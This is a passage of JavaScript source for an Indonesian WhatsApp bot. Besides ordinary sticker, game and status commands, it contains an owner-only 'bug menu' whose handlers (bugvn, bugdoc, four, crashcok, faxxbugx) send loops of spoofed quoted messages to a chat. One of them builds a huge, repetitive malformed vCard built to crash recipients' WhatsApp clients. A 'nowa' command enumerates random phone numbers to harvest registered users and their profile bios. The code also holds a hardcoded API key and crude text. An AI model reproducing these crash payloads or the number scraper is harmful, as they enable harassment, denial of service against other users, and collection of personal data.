            if (text) room.name = text
            freply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
            if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
            delete this.game[roomnya.id]
            freply(`Berhasil delete session room tictactoe !`)
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) freply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return freply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return freply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await hisoka.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) hisoka.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
case 'owner': case 'creator': {
                hisoka.sendContact(m.chat, global.owner, m)
            }
            break
case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                freply(respon)
            }
            break
//============= Convert File Massage
case 'sticker': case 's': case 'stickergif': case 'sgif': {
           if (/image/.test(mime)) {
           freply(mess.wait)
                let media = await hisoka.downloadMediaMessage(qmsg)
                let encmedia = await hisoka.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
            freply(mess.wait)
                if (qmsg.seconds > 11) return freply('Maksimal 10 detik!')
                let media = await hisoka.downloadMediaMessage(qmsg)
                let encmedia = await hisoka.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                freply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Video/Gif 1-9 Detik`)
                }
            }
            break
            case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': {
                let [teks1, teks2] = text.split`|`
                if (!teks1) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
                if (!teks2) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
            	freply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await hisoka.downloadMediaMessage(qmsg)
                    let encmedia = await hisoka.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return freply('Maksimal 10 detik!')
                    let media = await hisoka.downloadMediaMessage(qmsg)
                    let encmedia = await hisoka.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await hisoka.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'doge':
case 'dogestick':{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await hisoka.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'bucinstick':
case 'bucinp' :{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await hisoka.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'patrik':
case 'patrick': {
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await hisoka.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            freply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            freply(db)
        }
        break
            case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await hisoka.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await hisoka.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'attp': case 'ttp': {
           if (!text) throw `Example : ${prefix + command} text`
           await hisoka.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'hisoka', 'morou', m, {asSticker: true})

         }
         break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        freply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await hisoka.downloadMediaMessage(qmsg)
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await hisoka.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break
            case 'toimage': case 'toimg': {
                if (!/webp/.test(mime)) throw `Reply sticker dengan caption *${prefix + command}*`
                freply(mess.wait)
                let media = await hisoka.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    hisoka.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
                if (!/webp/.test(mime)) throw `Reply stiker dengan caption *${prefix + command}*`
                freply(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await hisoka.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break

case 'anticall': {
            if (!isCreator) throw mess.owner
                let ciko = db.data.settings[botNumber].anticall
                if (args[0] === "on") {
                if (ciko) return freply(`Sudah Aktif Sebelumnya`)
                ciko = true
                freply(`AntiCall Aktif !`)
                } else if (args[0] === "off") {
                if (!ciko) return freply(`Sudah Tidak Aktif Sebelumnya`)
                ciko = false
                freply(`AntiCall Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'anticall on', buttonText: { displayText: 'Enable' }, type: 1 },
                        { buttonId: 'anticall off', buttonText: { displayText: 'Disable' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode AntiCall`, hisoka.user.name, m)
                }
             }
             break
case 'nowa':
                   if (args.length < 1) return freply(`Kirim perintah ${command} nomer\nContoh ${prefix + command} 62888875467xx`)
                   var teks = args[0]
                   if (!teks.includes('x')) return freply('lah?')
                   freply(mess.wait)
                   function countInstances(string, word) {
                     return string.split(word).length - 1;
                   }
                   var nomer0 = teks.split('x')[0]
                   var nomer1 = teks.split('x')[countInstances(teks, 'x')] ? teks.split('x')[countInstances(teks, 'x')] : ''
                   var random_length = countInstances(teks, 'x')

                   var random;
                   if (random_length == 1) {
                     random = 10
                   } else if (random_length == 2) {
                     random = 100
                   } else if (random_length == 3) {
                     random = 1000
                   }

                   var nomerny = `List number\n\->have Bio\n`
                   var no_bio = `\nnot Bio || \nHey there! I am using WhatsApp.\n`
                   var no_watsap = `\nNot  registered \n`

                   for (let i = 0; i < random; i++) {
                     var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
                     var dom1 = nu[Math.floor(Math.random() * nu.length)]
                     var dom2 = nu[Math.floor(Math.random() * nu.length)]
                     var dom3 = nu[Math.floor(Math.random() * nu.length)]
                     var dom4 = nu[Math.floor(Math.random() * nu.length)]

                     var rndm;
                     if (random_length == 1) {
                       rndm = `${dom1}`
                     } else if (random_length == 2) {
                       rndm = `${dom1}${dom2}`
                     } else if (random_length == 3) {
                       rndm = `${dom1}${dom2}${dom3}`
                     } else if (random_length == 4) {
                       rndm = `${dom1}${dom2}${dom3}${dom4}`
                     }

                     var anu = await hisoka.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
                     var anuu = anu.length !== 0 ? anu : false

                     try {
                       try {
                         var anu1 = await hisoka.fetchStatus(anu[0].jid)
                       } catch {
                         var anu1 = '401'
                       }
                       if (anu1 == '401' || anu1.status.length == 0) {
                         no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                         console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
                       } else {
                         nomerny += `• *Nomor* wa.me/${anu[0].jid.split("@")[0]}\n• *Bio* : ${anu1.status}\n• *date* : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
                         console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
                       }
                     } catch {
                       no_watsap += `${nomer0}${i}${nomer1}\n`
                       console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [NOT REGISTERED]`, 'red'))
                     }
                   }
                   freply(`${nomerny}${no_bio}${no_watsap}`)
                   break
case 'menu':
case 'help':
case 'bugmenu':{
var monospace = '```'
var l = 1
hisoka.sendMessage(from, {
    caption: `Hi User ${pushname}

*• 🍬 Date Islamic*
      *_Wib_* : _${wib}_
      *_Wita_* : _${wita}_
      *_Wit_* : _${wit}_
      
      
*Runtime Bot*
_*- ${runtime(process.uptime())}*_

*Online WhatsApp*
Os-Time : ${runtime(os.uptime())}

            👺 *OTHER MENU*
                 *ℒ⃝🐋 • tictactoe* @tag
                 *ℒ⃝🐋 • afk*
                 *ℒ⃝🐋 • anticall* on
                 *ℒ⃝🐋 • anticall* off
                 *ℒ⃝🐋 • nowa*

            😈 *CONVERT MENU*

                 *ℒ⃝🐋 • sticker*
                 *ℒ⃝🐋 • emojimix*
                 *ℒ⃝🐋 • emojimix2*
                 *ℒ⃝🐋 • stickmeme*  <text>| <text>
                 *ℒ⃝🐋 • ttp* <text>
                 *ℒ⃝🐋 • attp* <text>
                 *ℒ⃝🐋 • toimage*
                 *ℒ⃝🐋 • dbinary*
                 *ℒ⃝🐋 • ebinary*
                 *ℒ⃝🐋 • tovideo*

             👿 *RAMDOM MENU*

                 *ℒ⃝🐋 • patrick*
                 *ℒ⃝🐋 • dogestick*
                 *ℒ⃝🐋 • bucinstick*
                 *ℒ⃝🐋 • gurastick*

            🔥 *Khusus owner*
            
                 *ℒ⃝🐋 • butto*
                 *ℒ⃝🐋 • stikto*
                 *ℒ⃝🐋 • catalogbug*
                 *ℒ⃝🐋 • bugvn*
                 *ℒ⃝🐋 • bugdoc*
                 *ℒ⃝🐋 • momo*
                 *ℒ⃝🐋 • momoto*
                 *ℒ⃝🐋 • gasmomo*
                 *ℒ⃝🐋 • gasinfinite*
                 *ℒ⃝🐋 • infinite*
                 *ℒ⃝🐋 • infiniteto*
                 *ℒ⃝🐋 • gassantet*
                 *ℒ⃝🐋 • santet*
                 *ℒ⃝🐋 • santetto*
                 *ℒ⃝🐋 • faraxxbug*
                 *ℒ⃝🐋 • vanfax*
                 *ℒ⃝🐋 • faraxxbug*
                 *ℒ⃝🐋 • faxxbugx*
                 *ℒ⃝🐋 • vanfax*
                 *ℒ⃝🐋 • crashcok*
                 *ℒ⃝🐋 • four*
                 *ℒ⃝🐋 • hihi*
                 *ℒ⃝🐋 • crashcok*

*🚨* *WARNING*
Berhati-hati dalam memilih menu
Dapat mengakibatkan crash!!!

*-Thank for*
 *-Arthur*
`,
    image: fs.readFileSync("./lib/thum.jpg"),
    buttons: [
      {
       buttonId: `owner`, 
       buttonText: {
        displayText: 'Contact Owner'
      }, type: 1},
      {
       buttonId: `speed`, 
       buttonText: {
        displayText: 'Speed To Bot'
      }, type: 2}
    ],
    footer: "© Arthur",
                contextInfo: {
"externalAdReply": { 
"title" : global.ownername,
"mediaType" : 1,
"renderLargerThumbnail" : true , 
"showAdAttribution": true, 
"jpegThumbnail": fs.readFileSync("./lib/thumb2.jpg"),
"mediaUrl": global.linkgrupss, 
"thumbnail": fs.readFileSync("./lib/thumb2.jpg"),
"sourceUrl" : global.linkgrupss 
}}
           },{ quoted : m })
           }
  break
//============================================= Menu Bug By Fardan Faraxx & Vannes =======================\\
	case 'bugvn':{
if (!isCreator) return
if (args.length == 0) return freply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('./faraxx/chan.mp3')
 hisoka.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
 }
 }
break
	case 'bugdoc':{
if (!isCreator) return
if (args.length == 0) return freply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) {
hisoka.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
	}
}
}})
}
}
break
case 'vanfax': {
	            if (!isCreator) return
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} My Name 𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ${text ? ': ' + text : ''}`)
            }
            break
case 'hihi': {
if (!isCreator) return
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`Hello Saya ${m.pushName} ${text ? ': ' + text : ''}`)
}
break
  case 'four':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let pek = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `kontol`, 
"jpegThumbnail": thumb
} 
} 
}
hisoka.sendText(m.chat, `🇹 🇭 🇪 🇫 🇴 🇺 🇷`, text, {quoted: pek})
}
}
break
 case 'crashcok':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolu = '``🔥 *Fax Faraxx Modeer* 🔥``',
hisoka.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${jobot}`,body: '🔥 *Fax Faraxx Moddrs* 🔥',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
}
}
break
case 'faxxbugx': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Fax`
for (let i = 0; i < jumlah; i++) {
const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© Fax Faraxx Modder ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 